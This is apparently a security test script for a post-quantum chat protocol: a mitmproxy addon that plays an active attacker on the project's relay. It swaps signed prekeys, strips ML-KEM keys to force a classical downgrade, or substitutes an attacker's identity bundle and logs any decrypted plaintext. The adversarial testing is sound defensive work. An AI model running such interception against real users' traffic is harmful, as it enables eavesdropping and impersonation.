"""mitmproxy addon: an active network attacker (A1) or malicious relay (A2) rewrites prekey bundles.

Run by attacks/run_mitm.py, which starts:  mitmdump --mode reverse:<relay> -s attacks/mitm_prekey_swap.py
Mode (environment variable PQCHAT_ATTACK):

  swap-spk       replace the signed X25519 prekey with the attacker's key, keep Bob's signatures
  strip-pq       remove every ML-KEM prekey (downgrade to classical, T-04)
  swap-identity  replace the whole bundle with Mallory's own valid bundle under Bob's name (T-02)

In swap-identity mode the addon also tries to decrypt Alice's initial message with Mallory's keys and
writes what it recovered to PQCHAT_ATTACK_LOG. Only synthetic accounts are used (CLAUDE.md §10).
"""

from __future__ import annotations

import json
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from mitmproxy import ctx, http

from pqchat import wire
from pqchat.protocol.bundle import IdentityKeys, PrekeyBundle, PrekeyStore
from pqchat.protocol.session import Session

MODE = os.environ.get("PQCHAT_ATTACK", "swap-spk")
LOG = Path(os.environ.get("PQCHAT_ATTACK_LOG", "attack-log.jsonl"))

NOW = int(time.time())
MALLORY = PrekeyStore(IdentityKeys.generate())
MALLORY.rotate_signed(NOW)
MALLORY.add_one_time(5, NOW)


def record(event: str, **fields: object) -> None:
    with LOG.open("a") as f:
        f.write(json.dumps({"mode": MODE, "event": event, **fields}) + "\n")


def tamper(bundle_bytes: bytes) -> bytes:
    real = PrekeyBundle.decode(bundle_bytes)
    if MODE == "swap-spk":
        from dataclasses import replace

        evil = MALLORY.bundle().spk
        return replace(real, spk=replace(real.spk, public=evil.public)).encode()
    if MODE == "strip-pq":
        from dataclasses import replace

        return replace(real, pqspk=None, pqopk=None).encode()
    if MODE == "swap-identity":
        return MALLORY.bundle().encode()
    return bundle_bytes


def websocket_message(flow: http.HTTPFlow) -> None:
    assert flow.websocket is not None
    msg = flow.websocket.messages[-1]
    if not msg.is_text:
        return
    try:
        obj = json.loads(msg.text)
    except ValueError:
        return
    if not msg.from_client and obj.get("type") == "bundle":
        original = wire.b64d(obj["bundle"], 64 * 1024)
        obj["bundle"] = wire.b64e(tamper(original))
        msg.text = json.dumps(obj, separators=(",", ":"))
        record("bundle_tampered", target=obj.get("username"))
        ctx.log.info(f"[attack:{MODE}] tampered bundle for {obj.get('username')}")
    elif msg.from_client and obj.get("type") == "send" and obj.get("kind") == "init":
        record("initial_message_seen", to=obj.get("to"))
        if MODE == "swap-identity":
            try:
                _, plaintext = Session.accept(MALLORY, wire.b64d(obj["blob"], wire.MAX_BLOB))
                record("attacker_decrypted", plaintext=plaintext.decode("utf-8", "replace"))
            except Exception as exc:
                record("attacker_failed", error=type(exc).__name__)
